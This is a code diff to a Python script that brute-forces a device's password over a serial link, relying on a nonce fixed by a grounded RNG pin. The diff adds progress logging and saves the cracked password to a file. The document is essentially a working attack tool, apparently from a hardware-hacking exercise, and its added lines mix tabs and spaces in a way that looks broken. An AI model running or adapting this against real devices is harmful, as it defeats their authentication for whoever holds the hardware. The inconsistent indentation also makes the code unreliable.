@@ -85,38 +85,50 @@ def main():
     print("----- Begin Bruteforce -----")
     # Bruteforce the User Password
     for rspNumber in range(startingPoint, endingPoint):
-        # Request Nonce
-        serialPort.write(requestNonce.encode())
-        temp = serialPort.readline() # Needed to flush the response
+		# Update Status
+    	if rspNumber % 0x1000 == 0:
+    		uFile = open(r"bforce-status.txt", "a")
+    		uFile.write("Last status: " + f'{rspNumber:08x}' + "\n")
+    		uFile.close()
 
-        # Read Response; Assume Nonce is the same everytime, because the RNG pin is shorted to GND
-        temp = serialPort.readline()
-        print("DEBUG: Received Nonce Message = " + temp.decode()) # Debug to see if response is correct
-        temp = serialPort.readline() # Needed to flush the response
+    	# Request Nonce
+    	serialPort.write(requestNonce.encode())
+    	temp = serialPort.readline() # Needed to flush the response
 
-        # Respond with bruteforced number
-        responseCommand = 'R' + f'{rspNumber:08x}' + crlf # Response in format Rxxxxxxxx
-        serialPort.write(responseCommand.encode())
-        print("DEBUG: Bruteforced command = " + responseCommand) # Debug to see if the response command is correct
+    	# Read Response; Assume Nonce is the same everytime, because the RNG pin is shorted to GND
+    	temp = serialPort.readline()
+    	print("DEBUG: Received Nonce Message = " + temp.decode()) # Debug to see if response is correct
+    	temp = serialPort.readline() # Needed to flush the response
 
-        # Wait for the response
-        while True:
-            temp = serialPort.read()
-            if temp.decode() not in ['','\r', '\n']:
-                break
-        print("DEBUG: Bruteforce result = " + temp.decode()) # Debug to see the actual response being received
-        
-        # Check if number was correct
-        if temp.decode() != 'E':
-            # Number was correct, print it
-            print("----- Success! -----")
-            print("")
-            print("-- Result is : ")
-            print(temp.decode() + serialPort.readline().decode())
-            print("")
-            print("-- Password is : ")
-            print(hex(rspNumber))
-            break
+    	# Respond with bruteforced number
+    	responseCommand = 'R' + f'{rspNumber:08x}' + crlf # Response in format Rxxxxxxxx
+    	serialPort.write(responseCommand.encode())
+    	print("DEBUG: Bruteforced command = " + responseCommand) # Debug to see if the response command is correct
+
+    	# Wait for the response
+    	while True:
+    		temp = serialPort.read()
+    		if temp.decode() not in ['','\r', '\n']:
+    			break
+    	print("DEBUG: Bruteforce result = " + temp.decode()) # Debug to see the actual response being received
+
+    	# Check if number was correct
+    	if temp.decode() != 'E':
+    		# Number was correct, print it
+    		print("----- Success! -----")
+    		print("")
+    		print("-- Result is : ")
+    		print(temp.decode() + serialPort.readline().decode())
+    		print("")
+    		print("-- Password is : ")
+    		print(hex(rspNumber))
+
+    		# Write this to a file also
+    		file = open(r"bforce-result.txt", "a")
+    		file.write("----- Success!----- \n")
+    		file.write("-- Password is : " + hex(rspNumber) + "\n")
+    		file.close()
+    		break
 
 # Run Main
 if __name__ == '__main__':
